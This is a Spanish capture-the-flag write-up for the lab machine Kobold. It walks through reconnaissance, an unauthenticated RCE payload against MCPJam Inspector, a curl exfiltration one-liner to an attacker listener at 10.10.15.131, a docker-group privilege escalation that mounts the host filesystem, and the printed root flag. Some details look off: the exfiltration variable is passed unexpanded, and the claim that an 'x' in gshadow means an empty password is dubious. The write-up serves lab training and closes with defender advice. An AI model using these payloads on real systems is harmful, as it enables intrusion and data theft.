1 — Reconocimiento

Paso 1 — Reconocimiento

Escaneo de puertos con nmap

¿Qué es nmap?

Network Mapper — herramienta de escaneo de redes que detecta puertos abiertos, servicios y versiones. Es el primer paso en cualquier pentest para conocer la superficie de ataque.

nmap -p- --open -n -T4 -sS 10.129.15.44
-p- → todos los 65535 puertos TCP
--open → solo puertos abiertos
-T4 → velocidad agresiva
-sS → SYN scan (más sigiloso)
nmap -p 22,80,443,3552 -sC -sV 10.129.15.44
Output
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1
80/tcp   open  http     nginx
443/tcp  open  https    nginx
3552/tcp open  http     arcane deployment platform v1.13.0
Interpretación

Puerto 443 → TLS con vhosts. Puerto 3552 → arcane (deployment platform). La presencia de nginx con SSL sugiere múltiples virtual hosts que debemos enumerar.

Decisión

Enumerar vhosts con gobuster/ffuf para descubrir subdominios en kobold.htb.

Paso 2 — Reconocimiento

Descubrimiento de Virtual Hosts

¿Por qué buscar vhosts?

Un servidor nginx puede servir múltiples aplicaciones en la misma IP, diferenciándolas por el header Host. Aplicaciones de administración suelen estar en subdominios separados.

gobuster vhost -u https://10.129.15.44 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -k
Output
Found: mcp.kobold.htb   → MCP Inspector (puerto 443)
Found: bin.kobold.htb   → PrivateBin (pastebin privado)
Interpretación

Dos vhosts:

  • mcp.kobold.htb → MCPJam Inspector, herramienta de desarrollo para servidores MCP
  • bin.kobold.htb → PrivateBin, servicio de pastebin cifrado (en contenedor Docker)
Decisión

Investigar MCP Inspector — es un servicio menos conocido con potencial de CVEs recientes.

2 — Foothold: CVE-2026-23744 (MCP Inspector RCE)

⚠ CVE-2026-23744 CVSS 9.8 CRÍTICA

MCPJam Inspector ≤ v1.4.2 permite RCE no autenticado. El inspector escucha en 0.0.0.0 (todas las interfaces) en lugar de 127.0.0.1, permitiendo que un atacante remoto envíe una petición HTTP que desencadena la ejecución de un servidor MCP arbitrario.

Paso 1 — Análisis de la vulnerabilidad

¿Cómo funciona la vulnerabilidad?

¿Qué es MCP Inspector?

Model Context Protocol Inspector es una herramienta de desarrollo que permite a los desarrolladores conectarse y probar servidores MCP. Expone una API REST para conectar servidores MCP especificando el comando a ejecutar.

El endpoint POST /api/mcp/connect acepta un serverConfig con el campo command y args — indica al inspector qué binario ejecutar para iniciar el servidor MCP. Al no validar ni restringir qué comandos se pueden ejecutar, cualquier petición puede lanzar comandos arbitrarios en el servidor.

// Estructura del payload vulnerable
{
  "serverId": "atacante",
  "serverConfig": {
    "command": "bash", ← comando a ejecutar
    "args": ["-c", "PAYLOAD"] ← reverse shell
  }
}
Paso 2 — Explotación

Exfiltración de datos via HTTP (base64 + curl)

¿Por qué base64+curl en lugar de reverse shell directa?

El servidor puede tener restricciones de firewall outbound. Esta técnica funciona aunque solo esté habilitado el tráfico HTTP saliente. Ejecutamos el comando, codificamos el output en base64 y lo enviamos a nuestro servidor como parámetro GET.

# Técnica de exfiltración: cmd → base64 → curl GET
EXFIL_CMD="(whoami) 2>&1 | base64 -w0 | xargs -I{} curl -s 'http://10.10.15.131:9000/?d={}'"
# Enviamos el payload al MCP Inspector
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"x","serverConfig":{"command":"bash","args":["-c","EXFIL_CMD"]}}'
Listener HTTP
# En nuestro listener HTTP recibimos:
GET /?d=YmVuCg==
# Decodificamos: echo "YmVuCg==" | base64 -d
ben
Resultado

Tenemos RCE como usuario ben (uid=1001). Podemos ejecutar cualquier comando en el servidor objetivo.

3 — Enumeración Post-Explotación

Paso 1 — Enumeración

Enumeración del usuario ben

id && cat /etc/passwd | grep -E 'ben|alice'
Output
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

ben:x:1001:1001::/home/ben:/bin/bash
alice:x:1000:1000::/home/alice:/bin/bash
Hallazgo clave

Ben pertenece al grupo operator (gid=37) además de su grupo primario. Los grupos no estándar son siempre candidatos a ser vectores de privesc.

Paso 2 — Enumeración

Análisis de membresías de grupo

cat /etc/group | grep -E 'operator|docker'
cat /etc/gshadow | grep -E 'operator|docker'
Output
operator:x:37:ben,alice
docker:x:111:alice

# /etc/gshadow:
docker:x:111:alice  ← 'x' = contraseña vacía
Hallazgo crítico

En /etc/group, Ben NO está en el grupo docker. Sin embargo, el grupo docker en /etc/gshadow tiene la contraseña como x, lo que significa que no tiene contraseña establecida — cualquier usuario puede cambiar a este grupo con newgrp docker o sg docker.

Decisión

Usar sg docker para ejecutar comandos como miembro del grupo docker, dándonos acceso al socket Docker.

Paso 3 — Enumeración

Verificar el socket Docker

ls -la /var/run/docker.sock
Output
srw-rw---- 1 root docker 0 Mar 23 06:50 /var/run/docker.sock
Interpretación

El socket Docker (/var/run/docker.sock) pertenece al grupo docker con permisos rw. Cualquier miembro del grupo docker puede comunicarse con el daemon Docker y ejecutar contenedores como root.

4 — Escalada de Privilegios: Docker Escape

Contexto técnico

¿Cómo funciona la escalada vía Docker?

El mecanismo técnico

1. El socket Docker (/var/run/docker.sock) es un archivo socket Unix que permite comunicación con el daemon Docker
2. Los contenedores Docker corren como root por defecto
3. Al montar el sistema de archivos del host (-v /:/hostfs) dentro del contenedor, tenemos acceso a todos los archivos del host como root
4. Esto incluye /root/root.txt, /etc/shadow, claves SSH, etc.

Analogía: Es como conseguir las llaves del edificio (socket Docker) y poder entrar a cualquier habitación (archivos del sistema) usando un passe-partout (contenedor root).

Paso 1 — Escalada

Uso de sg docker para cambiar de grupo

¿Qué es sg?

sg (switch group) permite ejecutar un comando como miembro de un grupo diferente al grupo primario. A diferencia de newgrp, no requiere una shell interactiva.

# Verificar que sg docker funciona (sin contraseña)
sg docker -c "id"
Resultado: uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
¡Funciona!

El gid ahora es 111(docker) — Ben está ejecutando comandos como miembro del grupo docker.

Paso 2 — Root Flag

Montaje del filesystem del host y lectura de root flag

sg docker -c "docker run \
  -v /:/hostfs \ ← monta / del host en /hostfs
  --rm \ ← eliminar contenedor al terminar
  --user root \ ← ejecutar como root
  --entrypoint cat \ ← usar 'cat' como entrypoint
  privatebin/nginx-fpm-alpine:2.0.2 \ ← imagen local
  /hostfs/root/root.txt" ← leer root.txt
Output
846c2c10c0cb72b6d2b4b9dc7254641f
¡ROOT FLAG CAPTURADO!

El contenedor montó el filesystem del host en /hostfs y leyó /root/root.txt con permisos de root.

5 — Rabbit Holes: Lo que NO era el camino

🕳 Arcane Service (CVE-2026-23520) — Lifecycle Command Injection

Arcane v1.13.0 tiene una vulnerabilidad de inyección de comandos en el updater, pero requiere credenciales de administrador. Intentamos brute force, JWT forgery con la ENCRYPTION_KEY y enumerar endpoints sin auth — nada funcionó.

🕳 /root/maint-*.sh scripts (Laurel audit labels)

El archivo /etc/laurel/config.toml contenía label-script."^/root/maint-.*[.]sh$" = "maint". Pasamos tiempo buscando cómo se disparaban. Era una pista falsa — el vector era Docker.

🕳 Staff group PATH hijacking

La documentación mencionaba PATH hijacking vía el grupo staff. En Kobold el grupo staff está completamente vacío — no aplica.

🕳 JWT Forgery con ENCRYPTION_KEY

Encontramos ENCRYPTION_KEY="Q3PbC9fpq/..." en el servicio systemd de arcane. Intentamos forjar JWTs HS256 — el servidor rechazó los tokens. La clave era para cifrado AES, no para firmar JWTs.

6 — Lecciones Aprendidas

⚔ Para el Atacante

  • Siempre probar sg [grupo] -c "id" para grupos no estándar
  • Los grupos sin contraseña en /etc/gshadow son switchables por cualquier usuario
  • Si hay Docker, siempre intentar el escape — es uno de los privesc más potentes
  • Usar imágenes ya presentes en el host para evitar descargas
  • No invertir tiempo en CVEs que requieren credenciales sin tenerlas primero

🛡 Para el Defensor

  • Nunca exponer MCP Inspector en 0.0.0.0 — solo 127.0.0.1
  • El grupo docker es efectivamente equivalente a root — no añadir usuarios innecesarios
  • Usar rootless Docker o socket proxy para limitar acceso
  • Auditar /etc/gshadow para grupos sin contraseña con miembros privilegiados
  • Usar seccomp/AppArmor profiles para restringir contenedores

8 — Glosario

MCP (Model Context Protocol)Protocolo de Anthropic para que modelos de IA se comuniquen con herramientas y servidores externos. El inspector es la herramienta de desarrollo para probar estos servidores.
CVE-2026-23744Vulnerabilidad de RCE en MCPJam Inspector ≤1.4.2. El inspector no valida qué comandos ejecuta, permitiendo a atacantes remotos ejecutar código arbitrario.
Docker socketArchivo /var/run/docker.sock — canal de comunicación con el daemon Docker. Tener acceso a este socket es equivalente a tener permisos de root.
sg (switch group)Comando Linux que ejecuta un programa bajo una membresía de grupo diferente. Similar a sudo pero para grupos.
/etc/gshadowArchivo que almacena contraseñas de grupos y miembros administrativos. Si la contraseña está vacía, cualquier usuario puede unirse al grupo.
Docker escapeTécnica de escalada que aprovecha el acceso al socket Docker para ejecutar un contenedor con el filesystem del host montado, obteniendo acceso de root al host.
Virtual Host (vhost)Técnica de nginx/Apache para servir múltiples sitios en la misma IP, distinguiéndolos por el header Host de la petición HTTP.
LaurelBackend de auditoría Linux que enriquece los logs de auditd con información adicional como líneas de comandos completas.
ArcanePlataforma de deployment de contenedores (open source, alternativa a Portainer). Gestiona ambientes Docker desde una interfaz web.
